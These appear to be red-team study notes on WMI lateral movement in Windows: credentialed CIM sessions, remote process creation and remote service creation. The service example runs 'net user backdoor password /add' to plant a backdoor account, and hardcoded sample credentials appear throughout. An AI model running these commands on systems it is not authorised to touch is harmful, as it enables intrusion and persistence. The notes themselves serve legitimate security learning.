[[Windows/Windows Internals/WMI]]
# Connecting to WMI on remote machine
### Protocols support
- **DCOM**: RPC over IP. Uses port 135/TCP and port 49152-65535/TCP.
- **Wsman**: Uses WinRM. uses port 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).
```powershell
# Create the PSCredential object to store the credntial
$username = "Administrator";
$password = "Password123";
$securepassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = [System.Management.Automation.PSCredential]::new($username,$securepassword);

# Configure Protocol to use
$opt = New-CimSessionOption -Protocol DCOM;

# Connect to the remote computer 
$session = New-CimSession -ComputerName <SERVER> -Credential $credential -SessionOption $opt -ErrorAction Stop;
```

# Remote Process Creation
- Required Group Membership : Administrators
### Powershell
```powershell
# Create a string storing the command to be executed
$command = "powershell.exe -Command Set-Content -Path C:\Temp\text.txt -Value Hello,World!";

Invoke-CimMethod -CimSession $session -Classname Win32_Process -MethodName create -Arguments @{
	CommandLine = $command;
} 
```
### CMD
```powershell
# For legacy system
wmic.exe /user:administrator /password:password123 /node:<server> process call create "cmd.exe /c calc.exe"
```
# Remote Service Creation
- Required Group Membership: Administrator
### Powershell
```powershell
# Create service
Invoke-CimMethod -CimSession $session -ClassName Win32_Service -MethodName create -Arguments @{
	Name = "MyService";
	DisplayName = "MyService";
	PathName = "net user backdoor password /add";
	ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
	StartMode = "Manual";
}

# Create a service object
$service = Get-CimInstance -CimSession $session -ClassName Win32_Service -filter "Name LIKE 'MyService'"

# Start the service
Invoke-CimMethod -InputObject $service -MethodName StartService
# Stop the service
Invoke-CimMethod -InputObject $service -MethodName StopService
# Delete Service
Invoke-CimMethod -InputObject $service -MethodName Delete

```